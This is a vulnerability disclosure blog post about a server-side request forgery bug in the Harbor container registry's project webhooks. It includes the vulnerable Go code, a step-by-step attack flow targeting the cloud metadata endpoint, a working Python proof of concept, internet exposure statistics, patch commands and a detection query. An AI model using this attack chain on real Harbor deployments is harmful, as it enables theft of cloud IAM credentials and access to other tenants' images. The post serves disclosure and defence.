---
title: "Any User, Any URL: Webhook SSRF in Harbor"
date: 2026-10-06 10:00:00 +0300
categories: [Vulnerability Research, Container Security]
tags: [SSRF, Harbor, containers, cloud, IMDS, webhooks, CVE Discovered]
cve: pending
cvss: 8.5
component: Harbor
bug_class: SSRF
vendor_advisory: https://github.com/goharbor/harbor/security/advisories/GHSA-2phj-cp9f-qq6w
republished:
  - outlet: OX Security
    url: https://www.ox.security/blog/harbor-ssrf-vulnerability-cloud-credentials/
description: >-
  Any registered Harbor user can create a project, and a project admin
  can point a webhook at any URL, including the cloud metadata endpoint.
  No validation, no admin needed. This is how a project webhook becomes a
  direct path to the registry's cloud IAM credentials.
---

{% include cve-head.html %}

OX Security Research found and disclosed a high-severity bug in Harbor, the CNCF container registry, that lets any registered user turn a project webhook into a direct path to the server's cloud IAM credentials. No admin access. No user interaction. You create a project and set a URL.

That low bar is the whole story. Most SSRF bugs in web apps need admin rights to configure an outbound request. This one needs a registered account, which any new user makes in their first five minutes. On instances with self-registration enabled, it needs nothing but a working email address.

Let me build it up from the basics, then show the code, the exploit, and what a scan of the public internet turned up.

## What Harbor is and why it is a target

Harbor is the CNCF's open-source container image registry, originally built by VMware. Organizations run it to store, sign, and scan the Docker and OCI images that power their infrastructure. CI/CD pipelines push to it, Kubernetes clusters pull from it, and scanners analyze everything inside it.

That position is what makes it attractive to attack. Harbor is not a file store off to the side, it is the hub of a software supply chain. The credentials Harbor holds to talk to cloud storage, to replication targets, and to scanning services reach well beyond the registry itself. Compromise Harbor's identity and you are often standing inside the cloud account it runs in.

For scale: the Harbor Core image has over 10 million pulls on Docker Hub, with nearly 109,000 in the week this was reported.

## Webhooks, and the one check that was not there

Harbor's webhook feature lets a project admin set a URL that Harbor calls automatically when a project event happens: an image push, a tag deletion, a scan finishing. When the event fires, Harbor's internal jobservice makes an outbound HTTP POST to that URL.

The problem is that Harbor accepted any URL at all. There was no check against private IP ranges, loopback, or cloud metadata endpoints. The validation that ran at webhook creation time, `validateTargets()` in `webhook.go`, did exactly one thing: it stripped the query string.

```go
// src/server/v2.0/handler/webhook.go
func (n *webhookAPI) validateTargets(policy *policy_model.Policy) (bool, error) {
    for i, target := range policy.Targets {
        url, err := utils.ParseEndpoint(target.Address)
        if err != nil {
            return false, errors.New(err).WithCode(errors.BadRequestCode)
        }
        // Prevent SSRF security issue #3755
        target.Address = url.Scheme + "://" + url.Host + url.Path
        // ...
    }
    return true, nil
}
```

The comment, "Prevent SSRF security issue #3755," is a previous attempt to fix this. It did not work. Stripping query parameters does nothing to stop `169.254.169.254`.

When the event fires, the jobservice picks up the stored address and delivers it with no further checks:

```go
// src/jobservice/job/impl/notification/webhook_job.go
func (wj *WebhookJob) execute(_ job.Context, params map[string]any) error {
    payload := params["payload"].(string)
    address := params["address"].(string)

    req, err := http.NewRequest(http.MethodPost, address, bytes.NewReader([]byte(payload)))
    // ...
    resp, err := wj.client.Do(req)
```

A plain `http.Client`, no transport-level filtering, no IP range checks. The address goes out as-is.

## SSRF and the metadata service, in one paragraph each

**Server-side request forgery** is getting a server to make a network request you chose. The value is not the request, it is the position. Harbor's jobservice sits inside the deployment, often inside a cloud VM, somewhere you cannot reach from outside. Steer its request and you borrow that vantage point.

The **cloud metadata service** is the prize. Every major cloud exposes it to its VMs at the link-local address `169.254.169.254`, with no authentication, on the assumption that only the machine itself can reach it. Ask it the IAM path and it returns temporary credentials for the identity the VM runs as. "SSRF to `169.254.169.254`" is the standard route from a web bug to live cloud credentials, and a webhook that POSTs to any URL is a clean way to get there.

## Who can actually do this

The webhook permission belongs to the `ProjectAdmin` role, which sounds like it should require privilege. Here is where Harbor's permission model becomes part of the bug: any user who creates a project is automatically its `ProjectAdmin`. Creating a project is the normal first thing a new user does, and Harbor encourages it. The moment that project exists, the user can configure its webhooks.

So the attack needs no elevated privileges, no admin invitation, and no special setup. On instances with self-registration enabled, a valid email address is the entire entry fee.

## Attack flow

1. Register or log into Harbor with any account.
2. Create a project. Harbor silently grants you `ProjectAdmin` on it.
3. Create a webhook pointing at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`. Harbor responds HTTP 201.
4. Push any image to the project, or wait for any project event to fire.
5. Harbor's jobservice delivers an HTTP POST to `169.254.169.254` with no validation.
6. The metadata service returns temporary IAM credentials for Harbor's cloud identity.
7. Use those credentials from anywhere on the internet.

The attacker does not even need to stay connected. You set the webhook and walk away.

## A second issue makes it worse

While reviewing the fix, something else surfaced: Harbor's jobservice was reflecting the full response body from webhook deliveries back into the project-readable task log.

In a real attack against the metadata service, that response body is a JSON object containing the instance's `AccessKeyId`, `SecretAccessKey`, and `SessionToken`. All of it was being written to a log visible to every `ProjectAdmin` on the project. The attacker who set the webhook gets the credentials, and so does anyone else on the project team who opens the task logs. One malicious webhook becomes a credential broadcast.

## Proof of concept

Tested on Harbor v2.12.0 using the official Docker Compose installer. The script stands up a local listener, creates a project and a webhook pointing at a private address, pushes a minimal image to fire the event, and prints what Harbor delivered.

Requirements: `pip3 install requests`

```python
#!/usr/bin/env python3
import hashlib, json, gzip, io, requests, threading, time
from http.server import HTTPServer, BaseHTTPRequestHandler

HARBOR    = "http://localhost:8880"
AUTH      = ("admin", "Harbor12345")
PROJECT   = "ssrf-test"
SSRF_PATH = "/latest/meta-data/iam/security-credentials/HarborRole"

received = []

class Listener(BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0))).decode()
        received.append(body)
        self.send_response(200); self.end_headers()
        self.wfile.write(b'{"AccessKeyId":"ASIA_CAPTURED","SecretAccessKey":"s3cr3t"}')
    def log_message(self, *_): pass

srv = HTTPServer(("0.0.0.0", 19998), Listener)
t = threading.Thread(target=lambda: [srv.handle_request() for _ in range(10)], daemon=True)
t.start()
print("[1] Listener started on :19998")

requests.post(f"{HARBOR}/api/v2.0/projects", auth=AUTH,
              json={"project_name": PROJECT, "public": False})

ssrf_url = f"http://host.docker.internal:19998{SSRF_PATH}"
r = requests.post(
    f"{HARBOR}/api/v2.0/projects/{PROJECT}/webhook/policies",
    auth=AUTH,
    json={"name": "ssrf-demo", "enabled": True, "event_types": ["PUSH_ARTIFACT"],
          "targets": [{"type": "http", "address": ssrf_url}]}
)
print(f"[2] Webhook created: HTTP {r.status_code}  (private IP accepted, no validation)")

def sha256(d): return "sha256:" + hashlib.sha256(d).hexdigest()
cfg   = json.dumps({"architecture":"amd64","os":"linux","rootfs":{"type":"layers","diff_ids":[]}},
                   separators=(",",":")).encode()
buf   = io.BytesIO()
with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0): pass
layer = buf.getvalue()
mfst  = json.dumps({
    "schemaVersion": 2,
    "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
    "config": {"mediaType": "application/vnd.docker.container.image.v1+json",
               "size": len(cfg), "digest": sha256(cfg)},
    "layers": [{"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
                "size": len(layer), "digest": sha256(layer)}]
}, separators=(",",":")).encode()

def push_blob(data, digest):
    r = requests.post(f"{HARBOR}/v2/{PROJECT}/trigger/blobs/uploads/", auth=AUTH, timeout=30)
    loc = r.headers.get("Location", "")
    put_url = loc if loc.startswith("http") else f"{HARBOR}{loc}"
    sep = "&" if "?" in put_url else "?"
    r2 = requests.put(f"{put_url}{sep}digest={digest}", data=data, auth=AUTH,
                      headers={"Content-Type": "application/octet-stream"}, timeout=30)
    return r2.status_code in (201, 204)

push_blob(cfg, sha256(cfg))
push_blob(layer, sha256(layer))
r = requests.put(f"{HARBOR}/v2/{PROJECT}/trigger/manifests/v1", data=mfst, auth=AUTH,
                 headers={"Content-Type": "application/vnd.docker.distribution.manifest.v2+json"},
                 timeout=30)
print(f"[3] Image pushed: HTTP {r.status_code} - jobservice will fire webhook in ~5-10s")

time.sleep(20)

if received:
    body = json.loads(received[0])
    evt  = body.get("events", [{}])[0]
    print()
    print("=" * 60)
    print("SSRF CONFIRMED")
    print("Harbor jobservice POSTed to private IP listener")
    print("=" * 60)
    print(f"  Event type   : {body.get('type')}")
    print(f"  Operator     : {body.get('operator')}")
    print(f"  Resource URL : {evt.get('resource', {}).get('resource_url')}")
    print(f"  SSRF path    : {SSRF_PATH}")
```

Expected output from a successful run:

```text
[1] Listener started on :19998
[2] Webhook created: HTTP 201  (private IP accepted, no validation)
[3] Image pushed: HTTP 201 - jobservice will fire webhook in ~5-10s

============================================================
SSRF CONFIRMED
Harbor jobservice POSTed to private IP listener
============================================================
  Event type   : PUSH_ARTIFACT
  Operator     : admin
  Resource URL : localhost:8880/ssrf-test/trigger:v1
  SSRF path    : /latest/meta-data/iam/security-credentials/HarborRole
```

The HTTP 201 on webhook creation confirms Harbor accepted a private IP without error. The jobservice then delivered the POST on its own when the push event fired, with no further involvement from the attacker.

## Threat intelligence

To gauge real-world exposure, OX Security scanned every Harbor instance indexed by Shodan at disclosure time: 6,370 publicly accessible instances, scanned on September 23, 2026.

Exposure at a glance:

- 6,370 Harbor instances publicly accessible.
- 4,221 (66.3%) expose `/api/v2.0/systeminfo` without authentication.
- 25 (0.6% of those open) have self-registration enabled, which means zero credentials required to exploit.
- 718 running on cloud infrastructure (710 AWS, 8 Azure), a direct IMDS path.
- 88.7% use local database auth (`db_auth`).

### The self-registration problem

Five of the 25 self-registration instances also configured enterprise SSO (three OIDC, two LDAP), but with self-registration left on, the identity provider is beside the point. Anyone can bypass it by registering a local account. Three of these instances resolve to Azure ranges, one to GCP. On these, the full attack chain needs nothing but internet access.

### What those instances are running

Passive inspection of public project listings on the self-registration instances surfaced some notable deployments. One Azure-hosted instance publicly exposes two actively used LLM inference containers, llama.cpp and a vLLM multimodal serving deployment, both pulled within three days of the report. That is a live production AI deployment where exploiting the SSRF returns Azure managed identity credentials that typically authorize GPU compute, model storage, and cloud ML workspaces. Another instance exposed 49 publicly browsable repositories, with project names pointing at a payment platform microservice stack.

### Research and government infrastructure

Reverse DNS across all 6,370 instances identified deployments at government-affiliated research institutions, national supercomputing facilities, and research universities across several continents. None had self-registration on, but institutional accounts at these places are handed out broadly to researchers, collaborators, and visiting scientists, so the real attacker pool is far larger than the full-time staff. One university security team runs MISP (Malware Information Sharing Platform) on their Harbor instance. An incident response team operating a vulnerable container registry is a finding in its own right.

### Supply chain exposure

One Harbor instance in the scan distributes a production service mesh, with over 560,000 pulls on a single component. Any authorized user of that registry, not just admins, can set a webhook and wait for routine registry activity to fire the SSRF against internal infrastructure. The bug reaches into the supply chains of every team pulling from that registry.

### Sector breakdown

The affected deployments span government and research computing, AI/ML infrastructure, open-source distribution, industrial automation, cybersecurity tooling, remote access platforms, and payment microservices.

## Threat status

No exploitation of this specific vulnerability has been reported. That is not much comfort, because Harbor is already targeted at scale: CERT/CC advisory VU#577436 (March 2026) confirmed attackers scanning and exploiting Harbor default credentials en masse. The scanning infrastructure exists. For the identical attack class, webhook SSRF to cloud IAM credential theft, the parallel MLflow vulnerability (CVE-2026-64849) was weaponized within hours of disclosure by financially motivated actors with automated tooling. I would expect the same timeline here.

A working proof of concept is included above and was provided to the Harbor security team during disclosure. There is no threat actor attribution. The bug was found through source code review by OX Security Research.

## Impact

The low privilege bar is the defining trait. In cloud deployments the consequences are concrete. Harbor's instance role is usually broad: read/write on the container image storage bucket shared across all tenants, access to vulnerability scanning services, and replication credentials for remote registries. Temporary credentials from the metadata service are valid for hours and work from anywhere on the internet.

It also breaks multi-tenant isolation at the storage layer. Harbor's RBAC enforces project-level separation inside the registry, but cloud credentials sit above that model entirely. A user in Tenant A who obtains Harbor's cloud identity can reach Tenant B's images directly in the storage bucket, going around Harbor's permission system completely.

## Remediation

Upgrade to a patched version:

```bash
# Harbor 2.13.x
docker compose down && docker pull goharbor/harbor-core:v2.13.6 && docker compose up -d

# Harbor 2.14.x
docker compose down && docker pull goharbor/harbor-core:v2.14.5 && docker compose up -d

# Harbor 2.15.x or latest
docker compose down && docker pull goharbor/harbor-core:v2.15.3 && docker compose up -d
```

v2.16.0 also includes the fix. The patch blocks private, loopback, link-local, and cloud-metadata addresses at both webhook creation time and delivery time, and it stops response bodies from being written to task logs.

Until you can upgrade:

1. Disable self-registration in Harbor admin settings.
2. Block egress from the Harbor jobservice to `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, and `169.254.0.0/16` at the host firewall or Docker network level.
3. On AWS, enforce IMDSv2 on the Harbor instance. Harbor's jobservice sends a plain POST, which IMDSv2 rejects, closing the credential-theft path specifically.

Detect existing malicious webhooks:

```bash
curl -s -u "admin:password" \
  "http://<harbor-host>/api/v2.0/projects/<project>/webhook/policies" | \
  jq '.[] | select(.targets[].address | test("169\\.254|127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.")) | {name: .name, address: .targets[].address}'
```

If you suspect past exploitation, rotate the IAM role attached to the Harbor instance immediately, then review CloudTrail (AWS), Cloud Audit Logs (GCP), or Activity Log (Azure) for API calls from unexpected source IPs using Harbor's cloud identity.

## Details and credits

- **Component:** Harbor (CNCF open-source container registry)
- **Class:** Server-side request forgery (CWE-918)
- **CVSS:** 8.5 High, `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
- **CVE:** pending assignment at time of writing
- **GitHub advisory:** GHSA-2phj-cp9f-qq6w (published October 6, 2026)
- **Affected:** >= 1.7.0 and < 2.13.6, 2.14.0 to < 2.14.5, 2.15.0 to < 2.15.3
- **Fixed:** v2.13.6, v2.14.5, v2.15.3, v2.16.0
- **Reported by:** Igor Stepansky, OX Security Research

## References

- GitHub Security Advisory: <https://github.com/goharbor/harbor/security/advisories/GHSA-2phj-cp9f-qq6w>
- Harbor webhook documentation: <https://goharbor.io/docs/latest/working-with-projects/project-configuration/configure-webhooks/>
- CWE-918 (Server-Side Request Forgery): <https://cwe.mitre.org/data/definitions/918.html>
